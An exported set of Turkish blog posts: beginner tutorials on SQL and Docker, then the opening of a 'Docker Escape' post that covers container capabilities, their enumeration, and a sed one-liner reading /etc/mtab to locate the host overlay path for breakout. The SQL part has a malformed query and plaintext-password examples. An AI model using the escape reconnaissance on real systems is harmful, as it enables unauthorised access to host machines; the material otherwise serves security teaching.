[{"categories":["Info"],"content":"1. SQL Bu yazımda temel SQL anlatacağım. Tablo oluşturma, veri ekleme, veri çekme, veri güncelleme, veri silme gibi konulardan bahsedeceğim\n1.1. Veritabanı Kurulumu Kuruluma geçmeden önce bu kurduğumuz veritabanı nedir? Ondan bahsedelim Veritabanı, yapılandırılmış verilerin depolandığı ve yönetildiği bir sistemdir. Bilgiyi organize etmek, erişmek ve güncellemek için kullanılır. Veritabanları genellikle ilişkisel tablolar şeklinde düzenlenir ve SQL gibi sorgu dilleriyle etkileşime girilir.\nSQL nedir ve ne işe yarar\u0026rsquo;a geçmeden önce, uygulamalı bir şekilde öğrenme adımlarımızı takip etmek için bir veritabanı oluşturalım. Bu eğitimde MYSQL Workbench kullanacağız. Elbette, PostgreSQL, SQL Server gibi başka veritabanı sistemleri de mevcut, ancak başlangıç için MYSQL\u0026rsquo;i tercih edeceğiz. Şimdi kuruluma geçelim.\n1.1.1. MYSQL Workbench İlk olarak MYSQL Server\rindirin, ardından MYSQL Workbench\rsitesine girin ve aşağıdaki adımları uygulayarak indirin.\nİlk olarak MYSQL Server indirin. Bu olmadan MYSQL Workbench kullanılamaz. Çünkü bağlanılacak server ortada yok. Kurulumu basit yukarıdaki siteden indirin.Sadece \u0026ldquo;Next\u0026rdquo; düğmesine tıklayarak ilerleyin. Son adımda, size aşağıdaki gibi bir soru sorulacaktır. Tavsiyem, indirmeyi tamamlamak için \u0026ldquo;COMPLETE\u0026rdquo; seçeneğini işaretlemenizdir.\nBunları yaptıktan sonra MYSQL Configurator penceresi gelecektir. Burada şimdilik bilmeniz gereken tek şey alttaki kısımda giriş yaparken kullanacağınız şifreyi belirtiniz.\nŞimdi MYSQL Workbench kurulumuna bakalım.\nAlt tarafta ise kendi işletim sisteminize göre seçin ve indirmeye başlayın.\nİndirme işlemi tamamlandıktan sonra yapılacak işlemler oldukça basittir. Sadece \u0026ldquo;Next\u0026rdquo; düğmesine tıklayarak ilerleyin. Son adımda, size aşağıdaki gibi bir soru sorulacaktır. Tavsiyem, indirmeyi tamamlamak için \u0026ldquo;COMPLETE\u0026rdquo; seçeneğini işaretlemenizdir. Böylelikle her şeyi ile birlikte bilgisayarınıza inicektir.\n1.1.2. Temel Kullanım İndirip açıktan sonra alttaki gibi görüntü göreceksiniz. Eğer MYSQL Server kurulumunuzda bir sıkıntı var ise bağlanmayacaktır.\nŞifreniz ile giriş yaptıktan sonra alttaki gibi bir pencere sizi karşılayacaktır.\nBurada 1 ile yazılan kısım Database\u0026rsquo;lerin olduğu yer. 2 ile yazılan kısım ise SQL sorgularınızı yazdığınız kısım. 1 Yazan kısıma sağ tıklayıp Create Schema ya tıklayıp yeni database oluşturunuz.\nOluşturduğunuz database\u0026rsquo;i seçmek için USE yazıp sonra adını yazıyoruz. Artık veritabanı hangi database üzerinden işlem yapacağınızı biliyor. Ardından örnek olarak bir tablo oluşturma sorgusu bunun içine yazılabilir. Alt tarafta örneği bulunmaktadır.\nTemel olarak kullanım bu kadar. Şimdi SQL sorgularına geçelim.\n1.2. Nedir? SQL (Structured Query Language), veritabanlarında veri depolamak, güncellemek ve sorgulamak için kullanılan bir programlama dilidir.\n1.3 Neden Kullanılır? Bu kısımda örnekler vererek açıklama yapacağım.\nBir internet sitesine girdiğinizde, üye olduğunuzda, giriş yaptığınızda veya bir sosyal medya sitesine girip bir gönderiyi beğendiğinizde, yaptığınız işlemlerin bir veritabanında saklanmasını genel olarak SQL ile gerçekleştiriyoruz.\nYaşadığımız bu yüzyılda, verilerin önemi giderek artmaktadır. Bu nedenle verinin doğru bir şekilde saklanması, doğru analiz edilmesi ve doğru bir şekilde kullanılması, yaptığınız projeler üzerinde büyük fayda sağlar.\nKısaca, hayatımızın her anında gittiğimiz yerler, telefondan girdiğimiz siteler, tıkladığımız linkler ve hatta bir videoyu kaç saniye izlediğimiz bile veritabanlarına SQL yardımıyla kaydediliyor. Peki, bu nasıl yapılır? Hadi bakalım.\n2. SQL\u0026rsquo;de Sorgu Yapısı Bu kısımda sorgulara girmeden önce ileride göreceğimiz temel işlemler hakında basit bilgi verip yapılarından bahstedeceğim.\nSQL ile yapabileceğiniz temel işlemler aşağıdaki gibidir.\nSELECT: Veritabanından veri çekmeyi sağlar. SELECT sutun-1,sutun-2,...,sutun-n FROM tablo_adi; Koşul ile birilikte kullanım.\nSELECT sutun-1,sutun-2,...,sutun-n FROM tablo_adi WHERE kosul; INSERT: Veritabanına veri eklemeyi sağlar. INSERT tablo_adi (sutun-1,sutun-2,...,sutun-n) VALUES (deger-1,deger-2,...,deger-n); UPDATE: Veritabanında hazır olan veriyi güncellemeyi sağlar. UPDATE tablo_adi SET sutun-1 = deger-1, sutun-2 = deger-2, ... sutun-n = deger-n WHERE kosul; DELETE: Veritabanında hazır olan veriyi silmeyi sağlar. DELETE FROM tablo_adi WHERE kosul; Yukarıdaki sorgu yapılarında farkındaysanız WHERE kullanılıyor. Bunun ile istediğimiz belirli bir veri üzerinde seçme,güncelleme ve silme işlemi yapılabilir. Daha detaylı açıklamayı alt tarafta bulabilirsiniz.\n3. SQL\u0026rsquo;de Temel İşlemler 3.1. Tablo Oluşturma (CREATE TABLE) Tablo oluşturmadan önce, tablonun ne olduğunu ve neden tablo oluşturduğumuzu anlamak önemlidir. Günümüzde, veritabanları verileri tablo dediğimiz yapılar içinde saklar. İşte aşağıda, bir veritabanında tutulan bir tabloyu temsil eden örnek bir yapı:\nid name surname 1 Çetin Boran Mesüm 2 Murat Kaan Mesüm Tabloların içinde saklanacak veri türlerini biz belirleriz ve yalnızca belirlediğimiz türde veri kabul ederiz. Tablo oluştururken ilk olarak CREATE TABLE ifadesiyle başlarız ve ardından tablonun adını belirtiriz. Yukarıda belirttiğimiz sütun adını ve alabileceği veri türünü de isimden sonra yazılan () içinde yazarız. İşte bir örnek yapısı:\nCREATE TABLE tablo_ismi( sütun1 veritürü özellikler, sütun2 veritürü özellikler, sütun3 veritürü özellikler, ) Bu kısımda sütun başlıkları belirtilir. Veri türü ise bu sütunda hangi tür veri saklanacağını belirtir. Veritabanına göre bu veri türleri değişiklik gösterebilir. İşte alt kısımda örnek veri türü:\nVARCHAR (Karakter Dizisi): Değişken uzunluktaki metinleri saklamak için kullanılır. Belirli bir maksimum uzunluğa sahip olabilir. CHAR (Karakter): Sabit uzunluktaki metinleri saklamak için kullanılır. Belirli bir uzunluğa sahip bir karakter dizisi olarak tanımlanır. Karakter dizisi bu uzunlukta değilse, boşluklarla doldurulur. INT (Tamsayı): Tam sayı değerlerini saklamak için kullanılır. İnteger olarak adlandırılır. FLOAT (Kayan Noktalı Sayı): Ondalık sayıları saklamak için kullanılır. Kesirli sayıları temsil eder. DATE (Tarih): Yıl, ay ve gün bilgisini saklamak için kullanılır. Yıl, ay ve gün değerlerini içerir. DATETIME (Tarih ve Saat): Yıl, ay, gün, saat, dakika ve saniye bilgisini saklamak için kullanılır. Tarih ve saat bilgisini içerir. Özellikler kısmı, o sütunların durumlarını tutar. Örneğin, bir sütuna veri girerken boş olup olmaması, varsayılan değeri ne olacağı, birincil anahtar mı yoksa yabancı anahtar mı olduğu gibi durumları belirtir. Veritabanlarına göre değişiklik gösterebilirler.\nNOT NULL: Bu özellik, bir sütunun boş olamayacağını belirtir. Yani, bu sütuna her zaman bir değer verilmelidir. DEFAULT: Bu özellik, bir sütuna varsayılan bir değer atar. Eğer sütuna değer verilmezse, bu varsayılan değer kullanılır. PRIMARY KEY: Bu özellik, bir sütunu birincil anahtar olarak belirtir. Her bir satırın benzersiz bir şekilde tanımlanması için kullanılır. Genellikle PRIMARY KEY otomatik atanır. Veri oluşturulurken atanmaz. Şimdi aşağıda örnek olarak bir tablo oluşturalım. Bu senaryoda bir sitedeki kullanıcı bilgilerini tutan bir tablo oluşturalım\nCREATE TABLE users ( id INT PRIMARY KEY, username VARCHAR(50) NOT NULL, email VARCHAR(100) UNIQUE, password VARCHAR(50) NOT NULL, birthDate DATE, registrationDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP ); 3.2. Seçme (SELECT) SELECT: Bu sorgu ile tabloya veri çekme işlemini yapacağız.\nSELECT sütun-1,sütün-2,...,sütün-n FROM tablo_ismi; Bu sorguda, SELECT anahtar kelimesiyle belirli sütunları seçtiğimizi belirtiyoruz. Ardından, virgülle ayrılmış bir şekilde istediğimiz sütun isimlerini yazıyoruz. Burada * koyarsak sütünları belirlediğimiz kısımda bütün sütünları alacaktır. Son olarak, veriyi çekeceğimiz tablonun adını belirtiyoruz. \u0026ldquo;;\u0026rdquo; sembolü sorgunun sonlandığını belirtir.\nBelirli bir sütunun belirli bir değere sahip olanları döndürmek istiyorsak, SQL\u0026rsquo;de WHERE ifadesini kullanırız. Öncelikle normal bir sorguyu yazıp, ardından WHERE ifadesini kullanarak belirli bir sütunun belirli bir değere eşit olduğu koşulunu ekleriz. Bu koşulu belirtmek için de sütun adını ve istenen değeri kullanırız. Örneğin, WHERE sütun_adı = 'değer' şeklinde bir ifade kullanarak belirli bir sütunun belirli bir değere eşit olan verileri getirebiliriz.\nAşağıdaki örnekte, users tablosundan id, username ve email sütunlarını çekiyorum. Ancak sadece username sütunu \u0026ldquo;2023an\u0026rdquo; olan verileri alıyorum.\nSELECT id, username, email FROM users WHERE username = \u0026#39;2023an\u0026#39;; Özetle WHERE kullanarak koşullu sorgular oluşturabiliyoruz.\nEğer verilerin belli sıralama ile gelmesini istiyorsak ORDER BY kullanacağız. Bununla ilgili sadece örnek vermek yeterli olucaktır.\nAşağıdaki örnekte, users tablosundan * ile bütün sütunları çekiyorum. Username sütununa göre alfabetik sıralama yapıyorum.\nSELECT * password FROM users ORDER BY username; Son olarak gruplama görelim. Bir kullanıcılar tablosu düşünün. İçerisinde isim, soyisim ve il olarak 3 tane sütun olsun. Benim istediğim hangi ilden kaç tane kullanıcı var onu bulmak istiyorum. Bunun için bilmemiz gereken iki tane yapı var.\nCOUNT(*) kullanarak bir tabloda kaç veri olduğunu öğrenebiliriz.\nAşağıda örnek olarak users tablosunda kaç kayıt var onu döndüren soruguyu görebilirsiniz.\nSELECT COUNT(*) FROM users; GROUP BY ile gruplamayı öğreneceğiz\nAşağıdaki örnekte, users tablosundan kullanıcı il\u0026rsquo;ini ve sayısını çekiyoruz ve bunları il\u0026rsquo;e göre grupluyoruz. Ek bilgi olarak burada AS anahtar kelimesi ile sütun ismini değiştirebiliyoruz.\nSELECT il, COUNT(*) AS Toplam FROM users GROUP BY il; Aşağıda bu sorgunun örnek bir çıktısını görebilirsiniz.\nusername il Toplam user1 Istanbul 3 user2 Ankara 2 user3 Istanbul 1 user4 Izmir 2 3.3. Ekleme (INSERT) INSERT: Bu sorgu ile tabloya veri ekleme işlemini yaparız.\nAşağıdaki örnekte, tablo_adı yazdıktan sonra ilk parantez içinde hangi sütunlara veri yükleyeceğimizi belirliyoruz. Sonrasında VALUES kısmında ise bu sütunlarla ilişkilendirilmiş değerleri belirtiyoruz. Özetle, sütun1 = değer1, sütun2 = değer2 gibi bir eşleştirme yapıyoruz.\nINSERT INTO tablo_adı (sütun1, sütun2, sütun3, ...) VALUES (değer1, değer2, değer3, ...); Aşağıdaki örnekte, users tablosuna username alanı için \u0026ldquo;2023an\u0026rdquo; ve password alanı için \u0026ldquo;cokgizlisifre123\u0026rdquo; değerlerini içeren bir veri ekledim.\nINSERT INTO users (username, password) VALUES (\u0026#39;2023an\u0026#39;, \u0026#39;cokgizlisifre123\u0026#39;); 3.4. Güncelleme (UPDATE) UPDATE:Bu sorgu ile tabloda hazır olan veriyi güncelleriz.\nAşağıdaki örnekte, UPDATE işlemiyle birlikte SET anahtar kelimesini kullanarak hangi sütunların güncelleneceğini belirtiriz ve her bir sütunun yeni değerini atarız. Bu sorgu genellikle WHERE ile birlikte kullanılır, bu sayede belirli koşullara uyan satırlar güncellenir.\nUPDATE tablo_adi SET sutun-1 = deger-1, sutun-2 = deger-2, ... sutun-n = deger-n WHERE kosul; Aşağıdaki örnekte users tablosunda id değeri 2 olan kullanıcının username\u0026rsquo;ini Kaan olarak değiştiriyorum.\nUPDATE users SET username=\u0026#39;Kaan\u0026#39; WHERE id = 2; 3.5. Silme (DELETE) DELETE: Bu sorgu ile tabloda olan bir veriyi silebiliyoruz.\nAşağıdaki örnekte, basit olarak bir silme işlemi yapılmıştır. Tablo içerisinden belli kayıtları sileceğimiz için WHERE ile kullanılır.\nDELETE FROM tablo_adi WHERE kosul; Bu örnekte ise users tablosu içerisinde id değeri 2 olan kullanıcıyı tablodan sildik.\nDELETE FROM users WHERE id = 2; 4. Kaynakça W3Schools\rFree Code Camp\r","permalink":"http://localhost:1313/posts/sql-101/","tags":["Database","MYSQL","SQL"],"title":"SQL 101"},{"categories":["Info","Tools"],"content":"1 - Docker 1.1 Konteyner Nedir? Konteyner, bir uygulamanın veya bir hizmetin kendi kütüphaneleri ve bağımlılıkları ile birlikte dış ortam ve uygulamalardan izole bir şekilde tutulmasına denir. Bu, bir tür sanallaştırma teknolojisidir.\nKonteyner != Sanal Makine (VM) Sanal makineler genellikle daha fazla sistem kaynağına ihtiyaç duyar ve daha uzun başlatma sürelerine sahiptir. Konteynerlara kıyasla, hafif ve hızlı dağıtım gerektiren senaryolarda sanal makineler daha ağır bir seçenek olabilir. Sanal makineler, daha fazla izolasyon içeren yerlerde tercih edilebilirler. Aşağıdaki resimde görüldüğü gibi, sanal makinelerin hepsi işletim sistemi üzerine kurulmuştur. Dolayısıyla izolasyonları konteynerlara kıyasla daha fazladır, ancak bu hızlı dağıtım ve taşınabilirliği azaltır.\nAncak konteynerlarda fazladan işletim sistemi yoktur, dolayısıyla sanal makinelerden daha az yer kaplarlar.\nÖrnek Diyelim ki backend ve database olarak PostgreSQL kullanacağız. Bu işi konteynerlarda yapmak hızlı ve minimum yer kaplarken, sanal makinelerde yapmak için iki ayrı işletim sistemi kurmak ve gerekli programları eklemek gerekmektedir; bu da gereksiz yer ve zaman harcamaya neden olur.\n1.2 Docker Nedir? Docker, konteyner\u0026rsquo;ları oluşturmak, yönetmek ve çalıştırmak için bir dizi araç ve hizmet sunan bir platformdur.\nNeden Kullanılır? İzolasyon Taşınabilirlik Hızlı dağıtım Kaynak Verimliliği Docker, hızlı dağıtım ve taşınabilirliği image\u0026rsquo;ler yardımı ile yapar. Image\u0026rsquo;ler sayesinde bir satır komut ile istediğimiz uygulamayı indirip kullanabiliriz. İleride daha çok değineceğiz.\nÖrnek Diyelim ki bir Backend ve bir Web Server\u0026rsquo;imiz var. Bu iki program da A paketinin x.x.x sürümünü kullansın. Şimdi eğer bizim Backend\u0026rsquo;e bir güncelleme geldiğinde ve artık A paketinin x.x.y sürümünü istediğinde ne yapacağız? Bizim Backend\u0026rsquo;imiz A pakettenin x.x.y sürümünü istiyor ancak Web Server\u0026rsquo;imiz A paketinin x.x.x sürümünü istiyor. Yani kısaca sürüm uyuşmazlığı yaşanıyor. Bu gibi durumlarda Docker kullanılabilir. Biz gidip Backend\u0026rsquo;i bir konteyner içine alacağız ve içine A paketinin x.x.y sürümünü yükleyeceğiz, aynı şekilde Web Server\u0026rsquo;i konteyner içine alacağız ve içine A paketinin x.x.x sürümünü yükleyeceğiz. Böylelikle bu iki uyuşmayan program, artık birlikte konteyner\u0026rsquo;lar yardımıyla kendi kütüphaneleri ve bağımlılıklarını kullanarak çalışabiliyorlar.\nNasıl Kullanılır? Ben burada Docker Desktop uygulamasını anlatmak yerine biraz command line üzerinden en çok kullanılan komutları anlatmayı daha uygun gördüm.\nGlobal\ndocker search image:tag: Docker Hub\u0026rsquo;tan\rbir imaj arar. docker pull image:tag: Docker Hub\u0026rsquo;tan\rbir imajı indirir. Network\ndocker network create name: Kendi ağınızı oluşturur. docker network ls: Oluşturulan tüm ağları listeler. docker network rm network_id: Belirtilen ağı siler. Image\ndocker images / docker image ls: Bilgisayarınıza yüklenmiş tüm imajları listeler. docker image rm image_id: Belirtilen imajı siler. docker image inspect \u0026lt;image\u0026gt;: İmaj hakkında detaylı bilgi sağlar. docker image build dockerFilePath / docker build dockerFilePath: Docker Dosyası kullanarak özel bir imaj oluşturmanızı sağlar. docker run [OPTIONS] image [COMMANDS]: Bir imajı kullanarak bir konteyner oluşturur. [COMMANDS] tamamlandıktan sonra kapanır. OPTIONS: --name: Konteynera özel bir isim atar. --rm: Konteyner işini bitirdikten sonra otomatik olarak kendini siler. -it: Konteyneri interaktif modda başlatır ve terminali size bağlar. -p: Konteynerin belirli bir portunu ana makineye yönlendirmek için kullanılır. -d: Konteynerı arkaplanda çalıştırır. -e: Çevresel değişkenleri belirlemek için kullanılır. -v: Ana makinedeki bir dizini veya dosyayı konteynere bağlamak için kullanılır. --network \u0026lt;name\u0026gt;: Konteynerin bağlı olduğu ağı belirtir. --secuity-opt PROFILES: Konteynerin bağlıolduğu ağı belirtir. --privileged: Konteyneri ana makinenin kernel düzeyinde ayrıcalıklı bir modda çalıştırır ve tüm yetkilere sahip olur. –-cap-add capability: Konteyner’a yetenek ekler. -–cap-drop capability: Konteyner\u0026rsquo;dan yetenek çıkarır. ALL: yazılırsa eğer capabilitiy yerine bütün belirli yetenekleri ekler/çıkarır. COMMANDS Aslında buradaki komutlar terminalde yazabileceğiniz her şey olabilir. ls -l sleep 3600 Containers\ndocker ps: Çalışan konteyner’ları listeler. -a: Çalışan çalışmayan tüm konteyner’ları listeler. docker start container_id/name: Belirli bir Konteyner’ı çalıştırır. docker stop container_id/name: Belirli bir Konteyner’ı durdurur. docker restart container_id/name: Belirli bir konteyner’ı yeniden başlatır. docker rm container_id/name: Belirli bir konteyner’ı siler. docker exec [OPTIONS] \u0026lt;container_id\u0026gt; [COMMAND]: Çalışan bir konteyner’da komut çalıştırmamızı sağlar. Kullanımı docker run ... ile benzerdir. docker exec my_container ls -l: my_container içinde ls –l komutunu çalıştırır. Uygulama Şimdi sizden basit bir uygulama yapmanızı isteyeceğim, docker\u0026rsquo;ı açın hello-world image\u0026rsquo;ini Docker Hub\u0026rsquo;tan indirin. Kontrol edin bakalım inmiş mi? Bu image\u0026rsquo;i kullanarak düz bir konteyner oluşturun işlevi nedir?. Çalışıp çalışmayan bütün konteyner\u0026rsquo;ları listeleyin ve ardından o açtığınız konteyner\u0026rsquo;ı silmeyi deneyin. Konteyner oluştururken yukarıda öğrendiğiniz bütün OPTION ları deneyip biraz zaman geçirmenizi tavsiye ediyorum.\n1.3 Dockerfile Nedir? Dockerfile, kendi özelleştirdiğimiz imajları oluşturmak için kullanılan bir dosyadır.\nNasıl Kullanılır? FROM image:tag: Konteyner’ın hangi image’ı temel alacağını beliritir. RUN command: İmaj üzerinde komutları çalıştırmak için kullanılır. **COPY hostPath containerPath**: Ana makinadan konteyner içine dosya kopyalamamızı sağlar. WORKDIR: Çalışma dizinini belirtir. EXPOSE: Konteyner\u0026rsquo;ın hangi portlarını dış dünyaya açacağını belirtir. CMD: Konteyner çalıştırıldığında otomatik olarak çalışacak komutu belirtir. Örnek Alttaki örnekte ubuntu\u0026rsquo;nun 18.04 sürümünü temel alacağımı belirttim. Ardından bu image\u0026rsquo;de olması gereken yükleme işlemlerini run komutu ile gerçekleştirdim. Ana dizinimi /app yaptıktan sonra kendi makinemden ./script.sh \u0026lsquo;ı konteyner içine kopyaladım. Son olarak konteyner çalıştığında çalışmasını istediğim komutu yazdım.\nFROM ubuntu:18.04 RUN apt update -y \u0026amp;\u0026amp; apt install nano WORKDIR /app COPY ./script.sh . CMD [\u0026#34;./script.sh\u0026#34;] Bu üstteki Dockerfile ı image yapmak için docker build -t image_tag dockerfilePath yazarız.\n1.4 Docker Compose Neden Lazım? Biz docker run kullanarak bir tane konteyner çalıştırıyoruz. Peki birden fazla konteyner\u0026rsquo;ı çalıştırmayı ayrıca bunları birbirine bağlamayı istersek ne yapacağız?\nModern bir site düşünelim. Backend: golang, Web Server: ngnix, Frontend: reactJS ve Database: PostgreSQL olsun. Ben bu siteyi docker\u0026rsquo;da kaldırmak için yapmam gereken 9 satır komut vardır.\nIlk olarak hepsi için docker build komutunu kullanıp Dockerfile larını kullanarak image\u0026rsquo;lerini oluşturmak. Sonra bu konteyner\u0026rsquo;ların birbirleri ile haberleşmesini sağlamak için docker network create name ile bir ağ oluşturmak. En son olarakta bu image\u0026rsquo;lerin hepsi için docker run yazıp --network tagı veya spesifik konteyner için spesifik option\u0026rsquo;ları eklemeliyim ki düzgün bir şekilde çalışabilsin.\nBu işlemi açıkça zor ve zaman alıcıdır. Bunu daha kolay yapmak için docker compose kullanıyoruz.\nNedir? Docker Compose, Docker tarafından sağlanan ve çoklu konteynerlı uygulamaları tanımlamak, yönetmek ve çalıştırmak için kullanılan bir araçtır.\nNeden İhtiyacımız Var? Modern bir site düşünelim. Frontend olarak React, Backend olarak Go, Web sunucusu olarak Nginx, Veritabanı olarak PostgreSQL kullanalım.\nBu senaryoda en az 4 konteyner bulunmaktadır. Konteyner\u0026rsquo;ları build edeceğiz ve çalıştıracağız aynı zamanda bazı konteynerların birbirine bağlanması için bir ağ oluşturmamız gerekmektedir.\nŞimdi minimal bir modern siteyi ayağa kaldırmak için kaç komut kullanmamız gerektiğine bakalım. İlk olarak konteynerları oluşturmamız gerekmektedir, bu nedenle 4 kez docker build ... komutunu kullanırız. Ardından, konteynerlar arasında bir ağ oluşturmak için docker network create ... komutunu kullanırız ve son olarak konteynerları çalıştırmak için docker run ... komutunu kullanırız. Ancak bu şekilde her bir konteyner için komutları hatırlamak ve yazmak zor olabilir.\nYukarıda da belirtildiği gibi toplamda 9 satır komut yazdık ve yalnızca bir minimal modern siteyi çalıştırdık. İşte bu nedenle Docker Compose\u0026rsquo;u kullanıyoruz.\nNasıl Yapılır? Docker Compose, YAML formatında bir dosya kullanarak birden fazla Docker konteynerini tek bir uygulama olarak tanımlamanıza ve yönetmenize olanak tanır.\nBu dosyayı birden fazla Dockerfile için yazacağınız docker run ... komutu olarak düşünebilirsiniz. Her Dockerfile için ayrı ayrı docker run bilgilerini giriyorsunuz ve tek komutla bütün Dockerfile\u0026rsquo;ları build edip çalıştırabiliyorsunuz.\nBurada kısa olsun diye backend ve database olarak olarak anlatacağım. Bu kısa bir örnek olacak daha fazla bilgi için kaynakça\u0026rsquo;ya bakabilirsiniz.\nİlk olarak docker-compose.yml dosyası oluşturun.\nversion: \u0026#39;3.9\u0026#39; services: backend: build: ./backend container_name: backend restart: always ports: - \u0026#34;8081:8081\u0026#34; depends_on: - postgres networks: - impact postgres: image: postgres:latest container_name: postgres environment: POSTGRES_USER: \u0026#34;test\u0026#34; POSTGRES_PASSWORD: \u0026#34;test\u0026#34; POSTGRES_DB: \u0026#34;test\u0026#34; ports: - \u0026#34;5432:5432\u0026#34; restart: on-failure volumes: - ./backend/script:/docker-entrypoint-initdb.d - ./postgres-data:/var/lib/postgresql/data networks: - impact networks: impact: driver: bridge version: Docker Compose versionunu belirtir. services: Docker Compose dosyasında tanımlanan servislerin başladığı bölümü başlatır. backend: Burada backend servisinin başladığını gösteriyor. Farklı şeylerde yazılabilir, örneğin web server, frontend gibi. image: Bu komut, kullanılacak Docker imajını belirtir. Genellikle resmi veya özel Docker imajları kullanılır. build: Dockerfile\u0026rsquo;ın yerini belirtir. container_name: Oluşturulacak olan konteyner\u0026rsquo;ın ismini verebilirsiniz. restart: Bu komut, bir konteynerin ne zaman yeniden başlatılacağını belirtir. always, on-failure veya unless-stopped gibi değerler alabilir. environment: Bu komut, bir konteynerin çalışma zamanı ortam değişkenlerini belirtir. Örneğin, veritabanı kullanıcı adı ve parolası gibi. volumes: Bu komut, host makinadaki dizinlerin veya dosyaların konteynere bağlanmasını sağlar. Bu, veri kalıcılığı ve paylaşımı için kullanılır. ports: Bu komut, bir konteynerin hangi portlarının host makinadaki portlara bağlanacağını belirtir. Genellikle hostPort:containerPort formatında kullanılır. depends_on: Bu komut, bir servisin başlaması için gereken diğer servisleri belirtir. Ancak, bu komut belirli bir servisin hazır olduğunu garanti etmez. networks: Bu komut, bir servisin hangi Docker ağlarında çalışacağını belirtir. Birden fazla ağa bağlanabilir ve ağlar arası iletişim sağlayabilir. Yukarıda temel olarak kullanılan docker-compose tagları yer alıyor. Tabikii daha fazla var bunun için kaynakça\u0026rsquo;dan daha fazla bilgi edinebilirsiniz.\nBu örnekte backend servisi alttaki Postgres servisini kullanıyor ve network aracılığı ile birbirleri ile etkileşim halindeler. Şimdi bu servisleri alttaki komutlar ile çalıştırıp kullanıma hazır hale getirebilirsiniz.\ndocker compose build: Bu komut, belirtilen docker dosyalarını (Dockerfile\u0026rsquo;ları) kullanarak tüm hizmetlerin imajlarını oluşturur. docker compose up: Bu komut, diğer parametrelere göre belirtilen tüm hizmetler için bir docker run komutu oluşturur. docker compose up --build: Yazarak tek seferde iki işlemi yapabilirsiniz. Kaynakça Intro to Docker LAB\rKablosuz Kedi\rMosh\rCompose Samples\r","permalink":"http://localhost:1313/posts/docker/","tags":["Docker","Dockerfile","Docker Compose","Container"],"title":"Docker 101"},{"categories":["Privileged"],"content":"Docker Escape 1. Docker Escape 1.1 Basics 1.1.1 Capabilities Nedir?\nBir kullanıcının veya sürecin sahip olduğu özel izinlerdir. Bu izinler, tipik kullanıcı izinlerinin ötesinde, özel işlemler için ayrıcalıklar sağlar.\nÖrnek\nBirkaç tane örnek yetenek ve açıklamasını alt tarafta bulabilirsiniz:\nCAP_CHOWN: Dosya sahipliğini değiştirme yeteneği. CAP_NET_BIND_SERVICE: 1024\u0026rsquo;den düşük portlara bağlama yeteneği. CAP_SYS_CHROOT: Chroot sistem çağrısını kullanma yeteneği. Keşif\nTamam ben yetenekleri anladım, bunları nasıl bulurum?\nBunun için capsh kullanabiliriz. capsh, linux yeteneklerini incelemek ve yönetmek için kullanılan bir araçtır.\nEğer capsh zafiyet aldığımız makinede yüklü ise direkt capsh --print yazarak bütün sahip olduğu yetenekleri keşfedebiliriz.\nEğer yüklü değil ise cat /proc/$PID/status dizini altında bütün işlemler hakkında bilgiler yer almakta bu kısımdan yetenekler hakkında bilgi alabiliriz.\nÜstteki resimde bir işlemin yeteneklerini görebilirsiniz. Bunu okunabilir bir halde görmek için yine capsh kullanıyoruz. capsh --decode=blob yazarsak ve yukarıda mesela CapEff kısmındaki yeri blob kısmına yazarsak bize yine üstteki gibi bir çıktı verecektir.\nBuradaki CapEff CapInh kısımlarına biraz açıklama getirelim.\nCapInh (Inherited Capabilities):Ebeveyn süreçten geçen yetenekleri belirler. CapPrm (Permitted Capabilities): Bir sürecin sahip olabileceği maksimum yetenek kümesini tanımlar. En fazla bu kadar yeteneğe sahip olabilirsin gibi. CapEff (Effective Capabilities): Bir sürecin her an kullandığı gerçek yetenekleri temsil eder. CapBnd (Bounding Capabilities): Bir sürecin sahip olabileceği en üst düzey kapasiteleri sınırlayan değerleri temsil eder. CapAmb (Ambient Capabilities): Bu, genellikle işlem tarafından kullanılabilecek olan, ancak şu anda doğrudan kullanılmayan yetenekler kümesidir. Dikkat Etmemiz Gereken Örnek Yetenekler\nSYS_MODULE: Yeteneği, kernel modüllerini yükleyip kaldırma yetkisini içerir. SYS_PTRACE: Yeteneği, ptrace() adlı sistem çağrısını kullanma izni sağlar. Bu sistem çağrısı, bir işlemin yürütülmesini izlemesine ve kontrol etmesine olanak tanır. SYS_ADMIN: Yeteneği, bir Linux işletim sisteminde kernel düzeyinde çok çeşitli ayrıcalıkları içeren bir yetenektir. Tabiki bu kadar az değil bir çok yetenek var dikkat edilmesi gereken. Burada birkaç tane örnek vermek istedim.\n1.1.2 OverlayFS (Overlay File System) Nedir?\nLinux tabanlı bir dosya sistemi teknolojisidir. İki veya daha fazla dosya sisteminin birleştirilmesine izin verir.\nUpperDir ve LowerDir adı verilen iki ana dizinden oluşur. UpperDir, birleştirilen dosya sisteminde yapılan değişiklikleri içerirken, LowerDir temel dosya sistemini temsil eder. OverlayFS, bu dizinleri birleştirerek birleşik bir dosya sistemini oluşturur ve üst dizinde yapılan değişiklikleri alt dizine uygular.\nBu kısımda asıl öğretmek istediğim Docker\u0026rsquo;ı çalıştıran Host\u0026rsquo;un bir path yardımı ile konteyner\u0026rsquo;daki dosyalara erişebilmesidir.\nUygulama\nAlt tarafta yavuzlar adında bir konteyner açıyorum ve bir dosyaya yazı yazıyorum.\nBurada docker inspect yavuzlar kullanarak UpperDir i alıyorum. Ardından cat ile o oluşturduğum dosyayı okumaya çalıyorum ve komut çalışıyor. Burada host makinede olduğumuza dikkat edelim.\nBurada docker inspect yavuzlar yazarak UpperDir pathini almayı başardık. Peki bunu docker escape yaparken nasıl elde edeceğiz. Bunun için alttaki komutu\rkullanacağız.\noverlay=`sed -n \u0026#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab` 1.1.3 Namespaces Nedir?\nBir işletim sistemi çekirdeği özelliğidir ve bir sistemdeki çeşitli sistem kaynaklarını izole etmek için kullanılır. Alt tarafa namespace\u0026rsquo;ler var.\nPID User Mount Net UTS IPC CGroup 1.1.4 CGroups Nedir?\nLinux işletim sisteminde kaynak yönetimi ve sınırlama sağlayan bir mekanizmadır. CGroups, sistem üzerinde çalışan işlemlere kaynak tahsisi yapmak, kaynakları izlemek ve sınırlamak için kullanılır. Bu sayede sistem yöneticileri, işlem gruplarına öncelik ve sınırlar belirleyerek sistem kaynaklarını etkin bir şekilde kullanabilirler.\nKullanıldığı Yerler\nKaynak Sınırlama (Resource Limitation) Öncelik Belirleme (Prioritization) İzleme ve İstatistikler (Monitoring and Statistics) Önceden Tanımlanmış Profiller (Pre-defined Profiles) 1.1.5 – Linux Security Modules (LSM) Nedir?\nLinux çekirdeğine eklenen güvenlik altyapısını ifade eder. Bu modüller, çekirdek seviyesinde güvenlik politikalarını uygulayarak sistem güvenliğini artırmaya 